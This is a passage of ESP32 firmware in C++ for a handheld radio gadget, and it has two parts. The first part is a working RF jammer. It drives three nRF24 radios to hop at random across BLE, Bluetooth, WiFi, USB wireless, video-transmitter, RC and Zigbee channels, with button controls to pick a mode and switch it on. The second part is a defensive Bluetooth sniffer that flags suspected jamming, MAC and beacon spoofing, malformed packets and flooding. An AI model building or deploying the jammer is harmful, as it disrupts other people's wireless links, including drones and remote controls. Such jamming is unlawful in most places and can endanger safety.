  tft.setTextColor(WHITE, DARK_GRAY);

  struct ButtonGuide {
    const char* label;
    const unsigned char* icon;
  };

  ButtonGuide buttons[] = {
    {jammerActive ? "[ON]" : "[OFF]", bitmap_icon_UP},
    {"MODE-", bitmap_icon_LEFT},
    {"MODE+", bitmap_icon_RIGHT}
  };

  int xPos = 20;
  int yPosIcon = 19;
  int spacing = 75;

  for (int i = 0; i < 3; i++) {
    tft.drawBitmap(xPos, yPosIcon, buttons[i].icon, 16, 16, TFT_WHITE);

    tft.setCursor(xPos + 18, yPosIcon + 4);
    tft.print(buttons[i].label);

    if (i < 2) {
      int sepX = xPos + spacing - 8;
      tft.drawFastVLine(sepX, 22, 12, LIGHT_GRAY);
    }

    xPos += spacing;
  }

  tft.drawRoundRect(0, 19, 240, 16, 4, LIGHT_GRAY);
  tft.drawLine(0, 19, 240, 19, TFT_WHITE);

}

void printModeChange(OperationMode mode) {
  String modeText = "[+] Mode changed to: ";
  switch (mode) {
    case BLE_MODULE:          modeText += "BLE";       break;
    case Bluetooth_MODULE:    modeText += "Bluetooth"; break;
    case WiFi_MODULE:         modeText += "WIFI";      break;
    case USB_WIRELESS_MODULE: modeText += "USB";       break;
    case VIDEO_TX_MODULE:     modeText += "Video";     break;
    case RC_MODULE:           modeText += "RC";        break;
    case ZIGBEE_MODULE:       modeText += "ZIGBEE";    break;
    case NRF24_MODULE:        modeText += "NRF24";     break;
    default: modeText                  += "Unknown";   break;
  }
  Print(modeText, TFT_WHITE, false);
}

void printJammerStatus(bool active) {
  String jammerText = "[!] Jammer ";
  jammerText += active ? "Activated" : "Deactivated";
  Print(jammerText, TFT_GREEN, false);
}

void checkModeChange() {
  checkButtons();

  if (modeChangeRequested) {
    modeChangeRequested = false;
    currentMode = static_cast<OperationMode>((currentMode + 1) % 8);
    initializeRadios();
    updateTFT();
    printModeChange(currentMode);
  }

  if (modeChangeRequested1) {
    modeChangeRequested1 = false;
    currentMode = static_cast<OperationMode>((currentMode == 0) ? 7 : (currentMode - 1));
    initializeRadios();
    updateTFT();
    printModeChange(currentMode);
  }

  if (jammerToggleRequested) {
    jammerToggleRequested = false;
    jammerActive = !jammerActive;
    initializeRadios();
    updateTFT();
    printJammerStatus(jammerActive);
  }
}

void prokillSetup() {
    tft.init();
    tft.setRotation(2);


  tft.fillScreen(TFT_BLACK);

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true);
  updateTFT();

  initializeRadios();

  pcf.pinMode(BTN_UP, INPUT_PULLUP);
  pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
  pcf.pinMode(BTN_LEFT, INPUT_PULLUP);
  pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);
  pcf.pinMode(BTN_SELECT, INPUT_PULLUP);

  Print("[+] System Ready!", TFT_GREEN, true);
}

void prokillLoop() {

  if (feature_active && isButtonPressed(BTN_SELECT)) {
    feature_exit_requested = true;
    return;
  }

  checkModeChange();

  if (jammerActive) {
    if (currentMode == BLE_MODULE) {
      int randomIndex = random(0, sizeof(ble_channels) / sizeof(ble_channels[0]));
      int channel = ble_channels[randomIndex];
      radio1.setChannel(channel);
      radio2.setChannel(channel);
      radio3.setChannel(channel);

    } else if (currentMode == Bluetooth_MODULE) {
      int randomIndex = random(0, sizeof(bluetooth_channels) / sizeof(bluetooth_channels[0]));
      int channel = bluetooth_channels[randomIndex];
      radio1.setChannel(channel);
      radio2.setChannel(channel);
      radio3.setChannel(channel);

    } else if (currentMode == WiFi_MODULE) {
      int randomIndex = random(0, sizeof(WiFi_channels) / sizeof(WiFi_channels[0]));
      int channel = WiFi_channels[randomIndex];
      radio1.setChannel(channel);
      radio2.setChannel(channel);
      radio3.setChannel(channel);

    } else if (currentMode == USB_WIRELESS_MODULE) {
      int randomIndex = random(0, sizeof(usbWireless_channels) / sizeof(usbWireless_channels[0]));
      int channel = usbWireless_channels[randomIndex];
      radio1.setChannel(channel);
      radio2.setChannel(channel);
      radio3.setChannel(channel);

    } else if (currentMode == VIDEO_TX_MODULE) {
      int randomIndex = random(0, sizeof(videoTransmitter_channels) / sizeof(videoTransmitter_channels[0]));
      int channel = videoTransmitter_channels[randomIndex];
      radio1.setChannel(channel);
      radio2.setChannel(channel);
      radio3.setChannel(channel);

    } else if (currentMode == RC_MODULE) {
      int randomIndex = random(0, sizeof(rc_channels) / sizeof(rc_channels[0]));
      int channel = rc_channels[randomIndex];
      radio1.setChannel(channel);
      radio2.setChannel(channel);
      radio3.setChannel(channel);

    } else if (currentMode == ZIGBEE_MODULE) {
      int randomIndex = random(0, sizeof(zigbee_channels) / sizeof(zigbee_channels[0]));
      int channel = zigbee_channels[randomIndex];
      radio1.setChannel(channel);
      radio2.setChannel(channel);
      radio3.setChannel(channel);

    } else if (currentMode == NRF24_MODULE) {
      int randomIndex = random(0, sizeof(nrf24_channels) / sizeof(nrf24_channels[0]));
      int channel = nrf24_channels[randomIndex];
      radio1.setChannel(channel);
      radio2.setChannel(channel);
      radio3.setChannel(channel);
      }
    }
  }
}

namespace BleSniffer {

#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 3

static bool uiDrawn = false;

static int iconX[ICON_NUM] = {170, 210, 10};
static const unsigned char* icons[ICON_NUM] = {
  bitmap_icon_undo,
  bitmap_icon_eye2,
  bitmap_icon_go_back
};

#define HEADER_HEIGHT 20
#define STATUS_DOT_SIZE 8
#define LINE_HEIGHT 16
#define MAX_LINES 16
#define MAX_DEVICES 32
#define SCAN_INTERVAL 5000
#define MAX_LINE_LENGTH 38
#define BEACON_PREFIX "4c000215"
#define ALERT_FLASH_DURATION 1000
#define SEPARATOR_THICKNESS 1
#define SEPARATOR_MARGIN 5
#define Y_OFFSET 37

struct Config {
  static constexpr int tftRotation = 0;
  static constexpr int serialBaud = 115200;
  static constexpr int bleScanDuration = 5;
  static constexpr int btScanDuration = 5;
  static constexpr int maxPacketCount = 20;
  static constexpr int minRssiThreshold = -20;
  static constexpr int maxNewDevices = 20;
  static constexpr int maxMfgDataLength = 31;
  static constexpr unsigned long deviceTimeout = 30000;
  static constexpr int maxRandomizedMacChanges = 5;
};

enum class MessageType {
  DEVICE,
  ALERT,
  STATUS
};

struct DeviceInfo {
  String mac;
  int rssi = 0;
  int packetCount = 0;
  bool isSuspicious = false;
  String deviceName;
  String serviceUUID;
  String beaconUUID;
  unsigned long lastSeen = 0;
  bool display = true;
  bool jammingAlerted = false;
  bool isBLE = true;
  int macChangeCount = 0;
};

struct DisplayLine {
  String text;
  uint16_t color = GREEN;
  uint16_t originalColor = GREEN;
  bool isAlert = false;
  unsigned long flashUntil = 0;
  MessageType type = MessageType::DEVICE;
};

class BluetoothSniffer {
private:
  TFT_eSPI tft;
  DeviceInfo devices[MAX_DEVICES];
  DisplayLine displayLines[MAX_LINES];
  int deviceCount = 0;
  int lineNumber = 1;
  int suspiciousCount = 0;
  int newDevicesThisScan = 0;
  int lastDeviceCount = -1;
  int lastSuspiciousCount = -1;
  bool scanning = true;
  bool isBLEScanActive = true;
  unsigned long lastScanTime = 0;
  unsigned long lastFlashToggle = 0;
  bool flashState = false;
  BLEScan* pBLEScan = nullptr;
  static BluetoothSniffer* snifferInstance;

  void initDisplay() {
    uiDrawn = false;

    float currentBatteryVoltage = readBatteryVoltage();
    drawStatusBar(currentBatteryVoltage, true);
    runUI();

    setupTouchscreen();
    tft.fillRect(0, 37, 240, 320, TFT_BLACK);
    tft.setTextSize(1);
    updateHeader();

  }

  void updateHeader() {
    tft.fillRect(0, Y_OFFSET, tft.width(), HEADER_HEIGHT, DARK_GRAY);
    tft.setTextColor(WHITE, DARK_GRAY);
    tft.setCursor(5, Y_OFFSET + 6);
    String status = isBLEScanActive ? "BLE Scanning" : "BT Scanning";
    tft.print(status + " | Dev: " + String(deviceCount) + " Sus: " + String(suspiciousCount));
    uint16_t dotColor = isBLEScanActive ? BLUE : GREEN;
    tft.fillCircle(tft.width() - 10, 46, STATUS_DOT_SIZE / 2, dotColor);
    tft.drawLine(0, 56, 240, 56, ORANGE);
  }

  void updateDisplay() {
    unsigned long now = millis();
    if (now - lastFlashToggle >= 500) {
      flashState = !flashState;
      lastFlashToggle = now;
    }
    tft.fillRect(0, Y_OFFSET + HEADER_HEIGHT, tft.width(), tft.height() - HEADER_HEIGHT, TFT_BLACK);
    for (int i = 0; i < MAX_LINES; i++) {
      if (displayLines[i].text.isEmpty()) continue;
      int y = Y_OFFSET + HEADER_HEIGHT + (i * LINE_HEIGHT);
      uint16_t textColor = displayLines[i].originalColor;
      if (displayLines[i].isAlert && displayLines[i].flashUntil > now) {
        textColor = flashState ? displayLines[i].originalColor : TFT_BLACK;
      }
      tft.setTextColor(textColor, TFT_BLACK);
      tft.setCursor(5, y + 2);
      tft.print(displayLines[i].text);
      if (displayLines[i].originalColor == ORANGE && !displayLines[i].isAlert) {
        tft.drawRect(3, y, tft.width() - 6, LINE_HEIGHT - 2, ORANGE);
      }
      if (i < MAX_LINES - 1 && !displayLines[i + 1].text.isEmpty() &&
          displayLines[i].type != displayLines[i + 1].type) {
        int separatorY = y + LINE_HEIGHT - 1;
        tft.drawFastHLine(SEPARATOR_MARGIN, separatorY, tft.width() - 2 * SEPARATOR_MARGIN, DARK_GRAY);
      }
    }
    if (deviceCount != lastDeviceCount || suspiciousCount != lastSuspiciousCount) {
      updateHeader();
      lastDeviceCount = deviceCount;
      lastSuspiciousCount = suspiciousCount;
    }
    if (deviceCount == 0 && lineNumber == 1) {
      tft.setTextColor(GREEN, TFT_BLACK);
      tft.setCursor(5, Y_OFFSET + HEADER_HEIGHT + 10);

    }
  }

  void addLine(String text, uint16_t color, bool isAlert = false, MessageType type = MessageType::DEVICE) {
    if (text.length() > MAX_LINE_LENGTH) {
      text = text.substring(0, MAX_LINE_LENGTH - 3) + "...";
    }
    for (int i = MAX_LINES - 1; i > 0; i--) {
      displayLines[i] = displayLines[i - 1];
    }
    displayLines[0].text = text;
    displayLines[0].color = color;
    displayLines[0].originalColor = (type == MessageType::STATUS) ? UI_DIM_TEXT : color;
    displayLines[0].isAlert = isAlert;
    displayLines[0].flashUntil = isAlert ? millis() + ALERT_FLASH_DURATION : 0;
    displayLines[0].type = type;
    updateDisplay();
  }

  void checkSuspiciousActivity(int idx, unsigned long timestamp) {
    auto& device = devices[idx];
    if (device.packetCount > Config::maxPacketCount || (device.isBLE && device.rssi > Config::minRssiThreshold)) {
      if (!device.isSuspicious) {
        device.isSuspicious = true;
        suspiciousCount++;
        if (device.display && !device.jammingAlerted) {
          String protocol = device.isBLE ? "BLE" : "BT";
          addLine(String(lineNumber++) + " -> Jamming Suspected (" + protocol + "): " + device.mac + " T:" + String(timestamp),
                  ORANGE, true, MessageType::ALERT);
          device.jammingAlerted = true;
        }
      }
    }
    if (device.isBLE && isRandomizedMac(device.mac) && device.macChangeCount > Config::maxRandomizedMacChanges) {
      device.isSuspicious = true;
      suspiciousCount++;
      if (device.display) {
        addLine(String(lineNumber++) + " -> MAC Spoofing Suspected (BLE): " + device.mac + " T:" + String(timestamp),
                ORANGE, true, MessageType::ALERT);
      }
    }
  }

  bool isRandomizedMac(const String& mac) {
    String firstByte = mac.substring(0, 2);
    char* end;
    long value = strtol(firstByte.c_str(), &end, 16);
    return (value & 0xC0) == 0xC0;
  }

  void processNewDevice(BLEAdvertisedDevice* bleDevice, esp_bt_gap_cb_param_t* btDevice, unsigned long timestamp, bool isBLE) {
    if (deviceCount >= MAX_DEVICES) {
      addLine("Max devices reached!", RED, true, MessageType::ALERT);
      return;
    }
    newDevicesThisScan++;
    auto& device = devices[deviceCount];
    device.isBLE = isBLE;
    if (isBLE) {
      device.mac = bleDevice->getAddress().toString().c_str();
      device.rssi = bleDevice->getRSSI();
      device.deviceName = bleDevice->getName().c_str();
      device.serviceUUID = bleDevice->getServiceUUID().toString().c_str();
      String mfgData = bleDevice->getManufacturerData().c_str();
      checkBeaconSpoofing(device, mfgData, timestamp);
      checkMalformedPacket(device, mfgData, timestamp);
    } else {
      char macStr[18];
      snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
               btDevice->disc_res.bda[0], btDevice->disc_res.bda[1], btDevice->disc_res.bda[2],
               btDevice->disc_res.bda[3], btDevice->disc_res.bda[4], btDevice->disc_res.bda[5]);
      device.mac = macStr;
      device.rssi = 0;
    }
    device.packetCount = 1;
    device.lastSeen = timestamp;
    device.display = true;
    checkMacSpoofing(device, timestamp);
    checkSuspiciousActivity(deviceCount, timestamp);
    if (device.display) {
      String protocol = isBLE ? "BLE" : "BT";
      String line = String(lineNumber++) + " -> " + device.mac + " (" + String(device.rssi) + " dBm, " + protocol + ")";
      if (isBLE && !device.deviceName.isEmpty()) line += " N:" + device.deviceName.substring(0, 6);
      if (isBLE && !device.serviceUUID.isEmpty()) line += " U:" + device.serviceUUID.substring(0, 8);
      line += " T:" + String(timestamp).substring(0, 6);
      addLine(line, device.isSuspicious ? ORANGE : GREEN, false, MessageType::DEVICE);
    }
    deviceCount++;
    if (newDevicesThisScan > Config::maxNewDevices && device.display) {
      String protocol = isBLE ? "BLE" : "BT";
      addLine(String(lineNumber++) + " -> Flooding Detected (" + protocol + ") T:" + String(timestamp),
              ORANGE, true, MessageType::ALERT);
    }
  }

  void checkBeaconSpoofing(DeviceInfo& device, const String& mfgData, unsigned long timestamp) {
    if (!device.isBLE || !mfgData.startsWith(BEACON_PREFIX)) return;
    device.beaconUUID = mfgData.substring(4, 36);
    for (int i = 0; i < deviceCount; i++) {
      if (devices[i].beaconUUID == device.beaconUUID && devices[i].mac != device.mac) {
        devices[i].isSuspicious = true;
        device.isSuspicious = true;
        suspiciousCount++;
        if (device.display) {
          addLine(String(lineNumber++) + " -> Beacon Spoofing (BLE): " + device.mac + " T:" + String(timestamp),
                  ORANGE, true, MessageType::ALERT);
        }
      }
    }
  }

  void checkMalformedPacket(DeviceInfo& device, const String& mfgData, unsigned long timestamp) {
    if (!device.isBLE || mfgData.length() <= Config::maxMfgDataLength) return;
    device.isSuspicious = true;
    suspiciousCount++;
    if (device.display) {
      addLine(String(lineNumber++) + " -> Malformed Packet (BLE): " + device.mac + " T:" + String(timestamp),
              ORANGE, true, MessageType::ALERT);
    }
  }

  void checkMacSpoofing(DeviceInfo& device, unsigned long timestamp) {
    for (int i = 0; i < deviceCount; i++) {
      if (devices[i].mac == device.mac && i != deviceCount) {
        devices[i].isSuspicious = true;
        device.isSuspicious = true;
        suspiciousCount++;
        if (device.display) {
          String protocol = device.isBLE ? "BLE" : "BT";
          addLine(String(lineNumber++) + " -> Possible Spoofing (" + protocol + "): " + device.mac + " T:" + String(timestamp),
                  ORANGE, true, MessageType::ALERT);
        }
      }
    }
  }

  void cleanupDevices(unsigned long timestamp) {
    for (int i = 0; i < deviceCount; ) {
      if (timestamp - devices[i].lastSeen > Config::deviceTimeout) {
        if (devices[i].isSuspicious) suspiciousCount--;
        for (int j = i; j < deviceCount - 1; j++) {
          devices[j] = devices[j + 1];
        }
        deviceCount--;
      } else {
        i++;
      }
    }
  }

  void filterByMac(const String& filterMac) {
    for (int i = 0; i < deviceCount; i++) {
      devices[i].display = (devices[i].mac == filterMac);
    }
    refreshDisplay();
  }

  void filterSuspicious() {
    for (int i = 0; i < deviceCount; i++) {
      devices[i].display = devices[i].isSuspicious;
    }
    refreshDisplay();
  }

  void refreshDisplay() {
    for (int i = 0; i < MAX_LINES; i++) {
      displayLines[i].text = "";
      displayLines[i].color = GREEN;
      displayLines[i].originalColor = GREEN;
      displayLines[i].isAlert = false;
      displayLines[i].flashUntil = 0;
      displayLines[i].type = MessageType::DEVICE;
    }
    lineNumber = 1;
    tft.fillRect(0, Y_OFFSET + HEADER_HEIGHT, tft.width(), tft.height() - HEADER_HEIGHT, TFT_BLACK);
    for (int i = 0; i < deviceCount; i++) {
      if (devices[i].display) {
        String protocol = devices[i].isBLE ? "BLE" : "BT";
        String line = String(lineNumber++) + " -> " + devices[i].mac + " (" + String(devices[i].rssi) + " dBm, " + protocol + ")";
        if (devices[i].isBLE && !devices[i].deviceName.isEmpty()) line += " N:" + devices[i].deviceName.substring(0, 6);
        if (devices[i].isBLE && !devices[i].serviceUUID.isEmpty()) line += " U:" + devices[i].serviceUUID.substring(0, 8);
        line += " T:" + String(devices[i].lastSeen).substring(0, 6);
        addLine(line, devices[i].isSuspicious ? ORANGE : GREEN, false, MessageType::DEVICE);
      }
    }
  }

void runUI() {

  static int iconY = STATUS_BAR_Y_OFFSET;

  if (!uiDrawn) {
    tft.drawLine(0, 19, 240, 19, TFT_WHITE);
    tft.drawLine(0, 36, 240, 36, ORANGE);
    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);

    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    tft.drawLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, TFT_WHITE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && millis() - lastAnimationTime >= 150) {
    if (animationState == 1) {
      tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      animationState = 2;

      switch (activeIcon) {
        case 0:
            deviceCount = 0;
            suspiciousCount = 0;
            lastDeviceCount = -1;
            lastSuspiciousCount = -1;
            lineNumber = 1;
            for (int i = 0; i < MAX_LINES; i++) {
              displayLines[i].text = "";
              displayLines[i].color = GREEN;
              displayLines[i].originalColor = GREEN;
              displayLines[i].isAlert = false;
              displayLines[i].flashUntil = 0;
              displayLines[i].type = MessageType::DEVICE;
            }
            refreshDisplay();
            addLine("Device list reset", DARK_GRAY, true, MessageType::STATUS);
          break;
        case 1:
           filterSuspicious();
          break;
        case 2:
           feature_exit_requested = true;
          break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = millis();
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    int x, y;
    if (feature_active && readTouchXY(x, y)) {
      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {
              tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
              animationState = 1;
              activeIcon = i;
              lastAnimationTime = millis();
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

public:
  void setup() {
    uiDrawn = false;

    float currentBatteryVoltage = readBatteryVoltage();
    drawStatusBar(currentBatteryVoltage, false);
    runUI();

    setupTouchscreen();

    initDisplay();

    pBLEScan = BLEDevice::getScan();
    pBLEScan->setAdvertisedDeviceCallbacks(new AdvertisedDeviceCallbacks(*this));
    pBLEScan->setActiveScan(true);

    addLine("Bluetooth Sniffer Ready", DARK_GRAY, true, MessageType::STATUS);
    startBLEScan();
  }

  void loop() {
    unsigned long now = millis();
    tft.drawLine(0, 19, 240, 19, TFT_WHITE);

    runUI();
    updateStatusBar();
    cleanupDevices(now);
    if (scanning && now - lastScanTime >= SCAN_INTERVAL) {
      if (isBLEScanActive) {
        pBLEScan->stop();
        startBTScan();
        isBLEScanActive = false;
      } else {

        startBLEScan();
        isBLEScanActive = true;
      }
      lastScanTime = now;
    }
    if (Serial.available()) {
      String input = Serial.readStringUntil('\n');
      input.trim();
      if (input.startsWith("FILTER MAC ")) {
        filterByMac(input.substring(11));
      } else if (input == "FILTER SUSPICIOUS") {
        filterSuspicious();
      } else if (input == "RESET") {
        deviceCount = 0;
        suspiciousCount = 0;
        lastDeviceCount = -1;
        lastSuspiciousCount = -1;
        lineNumber = 1;
        for (int i = 0; i < MAX_LINES; i++) {
          displayLines[i].text = "";
          displayLines[i].color = GREEN;
          displayLines[i].originalColor = GREEN;
          displayLines[i].isAlert = false;
          displayLines[i].flashUntil = 0;
          displayLines[i].type = MessageType::DEVICE;
        }
        refreshDisplay();
        addLine("Device list reset", DARK_GRAY, true, MessageType::STATUS);
      }
    }
  }

  class AdvertisedDeviceCallbacks : public BLEAdvertisedDeviceCallbacks {
    BluetoothSniffer& sniffer;
  public:
    AdvertisedDeviceCallbacks(BluetoothSniffer& s) : sniffer(s) {}
    void onResult(BLEAdvertisedDevice* advertisedDevice) override {
      String mac = advertisedDevice->getAddress().toString().c_str();
      int rssi = advertisedDevice->getRSSI();
      unsigned long timestamp = millis();
      int idx = -1;
      for (int i = 0; i < sniffer.deviceCount; i++) {
        if (sniffer.devices[i].mac == mac && sniffer.devices[i].isBLE) {
          idx = i;
          break;
        }
      }
      if (idx >= 0) {
        sniffer.devices[idx].rssi = rssi;
        sniffer.devices[idx].packetCount++;
        sniffer.devices[idx].lastSeen = timestamp;
        if (sniffer.isRandomizedMac(mac)) {
          sniffer.devices[idx].macChangeCount++;
        }
        sniffer.checkSuspiciousActivity(idx, timestamp);
      } else {
        sniffer.processNewDevice(advertisedDevice, nullptr, timestamp, true);
      }
    }
  };

  static void btCallback(esp_bt_gap_cb_event_t event, esp_bt_gap_cb_param_t *param) {
    if (!snifferInstance) return;
    if (event == ESP_BT_GAP_DISC_RES_EVT) {
      unsigned long timestamp = millis();
      int idx = -1;
      char macStr[18];
      snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
               param->disc_res.bda[0], param->disc_res.bda[1], param->disc_res.bda[2],
               param->disc_res.bda[3], param->disc_res.bda[4], param->disc_res.bda[5]);
      String mac = macStr;
      for (int i = 0; i < snifferInstance->deviceCount; i++) {
        if (snifferInstance->devices[i].mac == mac && !snifferInstance->devices[i].isBLE) {
          idx = i;
          break;
        }
      }
      if (idx >= 0) {
        snifferInstance->devices[idx].packetCount++;
        snifferInstance->devices[idx].lastSeen = timestamp;
        snifferInstance->checkSuspiciousActivity(idx, timestamp);
      } else {
        snifferInstance->processNewDevice(nullptr, param, timestamp, false);
      }
    }
  }

  void startBLEScan() {
    newDevicesThisScan = 0;
    pBLEScan->start(Config::bleScanDuration, false);
    addLine("BLE Scan Started T:" + String(millis()), DARK_GRAY, true, MessageType::STATUS);
    updateHeader();
  }

  void startBTScan() {
    newDevicesThisScan = 0;

    addLine("Classic BT Scan Started T:" + String(millis()), DARK_GRAY, true, MessageType::STATUS);
    updateHeader();
  }

  void setSnifferInstance() {
    snifferInstance = this;
  }

  void stop() {
    scanning = false;
    if (pBLEScan) {
      pBLEScan->stop();
    }
  }
};

BluetoothSniffer* BluetoothSniffer::snifferInstance = nullptr;
BluetoothSniffer sniffer;

void blesnifferSetup() {
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);
  sniffer.setup();
  sniffer.setSnifferInstance();
}

void blesnifferLoop() {

  if (feature_active && isButtonPressed(BTN_SELECT)) {
    feature_exit_requested = true;
    return;
  }

  sniffer.loop();
  }

void exit() {

  sniffer.stop();
}
}
